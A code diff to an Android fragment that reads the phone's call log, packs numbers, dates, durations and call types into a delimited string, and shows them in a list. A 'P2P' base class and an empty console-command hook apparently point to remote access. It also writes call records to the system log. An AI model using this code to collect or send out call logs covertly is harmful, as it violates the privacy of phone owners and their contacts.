@@ -12,6 +12,7 @@ import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
 import android.widget.BaseAdapter;
+import android.widget.TextView;
 
 import java.util.ArrayList;
 
@@ -61,26 +62,27 @@ public class CallLogFragment extends P2PFragment {
         final Cursor c = context.getContentResolver().query(Uri.parse("content://call_log/calls"),
                 callLogColumns, null, null, "Calls._ID DESC"); //last record first
 
-        while (c.moveToNext()) {
-            final long id = c.getLong(c.getColumnIndex(CallLog.Calls._ID));
-            final long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
-            final String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
-            final long duration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
-            final String type = c.getString(c.getColumnIndex(CallLog.Calls.TYPE));
-            builder.append(id);
-            builder.append("//");
-            builder.append(date);
-            builder.append("//");
-            builder.append(number);
-            builder.append("//");
-            builder.append(duration);
-            builder.append("//");
-            builder.append(type);
+        if (c.moveToFirst()) {
+            do {
+//                final long id = c.getLong(c.getColumnIndex(CallLog.Calls._ID));
+                final long date = c.getLong(c.getColumnIndex(CallLog.Calls.DATE));
+                final String number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));
+                final long duration = c.getLong(c.getColumnIndex(CallLog.Calls.DURATION));
+                final String type = c.getString(c.getColumnIndex(CallLog.Calls.TYPE));
+                builder.append(date);
+                builder.append("//");
+                builder.append(number);
+                builder.append("//");
+                builder.append(duration);
+                builder.append("//");
+                builder.append(type);
 
-            if (!c.isLast())
-                builder.append(":/:/");
+                if (!c.isLast())
+                    builder.append(":/:/");
+            } while (c.moveToNext());
+        } else {
+            //empty
         }
-
         return builder.toString();
     }
 
@@ -101,6 +103,10 @@ public class CallLogFragment extends P2PFragment {
         Log.e("Call Logs > ", callLogItems.toString());
 
         return callLogItems;
+    }
+
+    public static void handleConsoleCommand(String command) {
+
     }
 
     @Override
@@ -138,7 +144,7 @@ public class CallLogFragment extends P2PFragment {
 
         @Override
         public int getCount() {
-            return 0;
+            return callLogItems.size();
         }
 
         @Override
@@ -153,7 +159,37 @@ public class CallLogFragment extends P2PFragment {
 
         @Override
         public View getView(int position, View convertView, ViewGroup parent) {
-            return null;
+            final ViewHolder holder;
+
+            if (convertView == null) {
+                convertView = View.inflate(context, R.layout.disconnected_button, null);
+                final TextView from_to = (TextView) convertView.findViewById(R.id.from_to);
+                final TextView duration = (TextView) convertView.findViewById(R.id.duration);
+                final TextView type = (TextView) convertView.findViewById(R.id.type);
+                final TextView date = (TextView) convertView.findViewById(R.id.date);
+                holder = new ViewHolder(from_to, duration, type, date);
+                convertView.setTag(holder);
+            } else {
+                holder = (ViewHolder) convertView.getTag();
+            }
+
+            final CallLogItem item = callLogItems.get(position);
+            holder.duration.setText(String.valueOf(item.duration));
+            holder.type.setText(item.type);
+            holder.date.setText(item.getDate());
+            holder.from_to.setText(item.number);
+            return convertView;
+        }
+
+        private static class ViewHolder {
+            final TextView from_to, duration, type, date;
+
+            public ViewHolder(TextView from_to, TextView duration, TextView type, TextView date) {
+                this.from_to = from_to;
+                this.duration = duration;
+                this.type = type;
+                this.date = date;
+            }
         }
     }
 }
